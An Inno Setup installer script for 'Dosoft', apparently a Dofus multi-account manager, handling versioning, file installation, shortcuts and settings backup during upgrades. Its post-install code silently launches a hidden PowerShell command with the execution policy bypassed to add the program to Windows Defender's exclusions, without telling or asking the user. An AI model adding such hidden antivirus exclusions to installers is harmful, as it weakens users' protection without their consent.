; ============================================================
;  DOSOFT - Script Inno Setup
;  Prerequis : Inno Setup 6+ (https://jrsoftware.org/isinfo.php)
;  A lancer APRES la compilation Nuitka (build_dosoft.cmd)
; ============================================================

#define AppName      "Dosoft"
#define AppPublisher "Dosoft"
#define AppExeName   "Dosoft.exe"
#define SourceDir    "dist"
#define VersionFile  "version.json"
#define VersionRaw   FileRead(VersionFile)
#define VersionKey   "\"version\": \""
#define VersionStart Pos(VersionKey, VersionRaw)
#if VersionStart > 0
  #define VersionTail Copy(VersionRaw, VersionStart + Len(VersionKey), 255)
  #define AppVersion Copy(VersionTail, 1, Pos("\"", VersionTail) - 1)
#else
  #define AppVersion "0.0.0"
#endif

[Setup]
AppId={{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}
AppName={#AppName}
AppVersion={#AppVersion}
AppPublisher={#AppPublisher}

; --- Dossier d'installation ---
DefaultDirName={autopf}\{#AppName}
DefaultGroupName={#AppName}
DisableProgramGroupPage=yes

; --- Sortie de l'installeur ---
OutputDir=installer_output
OutputBaseFilename=Dosoft_Setup_v{#AppVersion}

; --- Apparence ---
SetupIconFile=logo.ico
WizardStyle=modern
WizardSizePercent=120

; --- Compression maximale ---
Compression=lzma2/ultra64
SolidCompression=yes
LZMAUseSeparateProcess=yes

; --- Droits administrateur obligatoires ---
PrivilegesRequired=admin
PrivilegesRequiredOverridesAllowed=

; --- Divers ---
ShowLanguageDialog=no
LanguageDetectionMethod=uilanguage
UninstallDisplayIcon={app}\{#AppExeName}
UninstallDisplayName={#AppName}
VersionInfoVersion={#AppVersion}
VersionInfoCompany={#AppPublisher}
VersionInfoDescription=Gestionnaire multi-compte Dofus - Dosoft

[Languages]
Name: "french"; MessagesFile: "compiler:Languages\French.isl"

[Tasks]
Name: "desktopicon"; Description: "Créer un raccourci sur le Bureau";         GroupDescription: "Raccourcis :"
Name: "startmenuicon"; Description: "Créer un raccourci dans le Menu Démarrer"; GroupDescription: "Raccourcis :"

[Files]
; --- Executable principal (compilé par Nuitka/PyInstaller) ---
Source: "{#SourceDir}\{#AppExeName}"; DestDir: "{app}"; Flags: ignoreversion

; --- Ressources ---
Source: "logo.ico"; DestDir: "{app}"; Flags: ignoreversion
Source: "skin\*";     DestDir: "{app}\skin";   Flags: ignoreversion recursesubdirs createallsubdirs
Source: "sounds\*";   DestDir: "{app}\sounds"; Flags: ignoreversion recursesubdirs createallsubdirs

[Icons]
; --- Raccourci Bureau ---
Name: "{autodesktop}\{#AppName}"; Filename: "{app}\{#AppExeName}"; IconFilename: "{app}\logo.ico"; Tasks: desktopicon

; --- Raccourci Menu Démarrer ---
Name: "{group}\{#AppName}";                    Filename: "{app}\{#AppExeName}"; IconFilename: "{app}\logo.ico"; Tasks: startmenuicon
Name: "{group}\Désinstaller {#AppName}";       Filename: "{uninstallexe}"

[Run]
; --- Lancement après installation ---
Filename: "{app}\{#AppExeName}"; Description: "Lancer {#AppName} maintenant"; Flags: nowait postinstall skipifsilent runascurrentuser

; [UninstallDelete]
; Type: files;          Name: "{app}\settings.json"
; Type: filesandordirs; Name: "{app}"

[Code]
function GetUninstallString(): String;
var
  sUnInstPath: String;
  sUnInstallString: String;
begin
  sUnInstPath := ExpandConstant('Software\Microsoft\Windows\CurrentVersion\Uninstall\{#SetupSetting("AppId")}_is1');
  sUnInstallString := '';
  if not RegQueryStringValue(HKLM, sUnInstPath, 'UninstallString', sUnInstallString) then
    RegQueryStringValue(HKCU, sUnInstPath, 'UninstallString', sUnInstallString);
  Result := sUnInstallString;
end;

function IsUpgrade(): Boolean;
begin
  Result := (GetUninstallString() <> '');
end;

function UnInstallOldVersion(): Integer;
var
  sUnInstallString: String;
  iResultCode: Integer;
begin
  Result := 0;
  sUnInstallString := GetUninstallString();
  if sUnInstallString <> '' then begin
    sUnInstallString := RemoveQuotes(sUnInstallString);
    if Exec(sUnInstallString, '/SILENT /NORESTART /SUPPRESSMSGBOXES', '', SW_HIDE, ewWaitUntilTerminated, iResultCode) then
      Result := 3
    else
      Result := 2;
  end else
    Result := 1;
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  ExePath: String;
  ResultCode: Integer;
  SettingsPath: String;
  BackupPath: String;
begin
  SettingsPath := ExpandConstant('{app}\settings.json');
  BackupPath := ExpandConstant('{tmp}\settings_backup.json');

  if (CurStep = ssInstall) then begin
    // 1. On sauvegarde le fichier existant AVANT de désinstaller l'ancienne version
    if FileExists(SettingsPath) then begin
      FileCopy(SettingsPath, BackupPath, False);
    end;

    if (IsUpgrade()) then
      UnInstallOldVersion();
  end;

  if (CurStep = ssPostInstall) then begin
    // 2. On restaure le fichier dans le dossier tout neuf
    if FileExists(BackupPath) then begin
      FileCopy(BackupPath, SettingsPath, False);
    end;

    // Après installation : exclusion Windows Defender pour éviter faux positifs
    ExePath := ExpandConstant('{app}\{#AppExeName}');
    Exec('powershell.exe',
      '-ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExePath + '''"',
      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;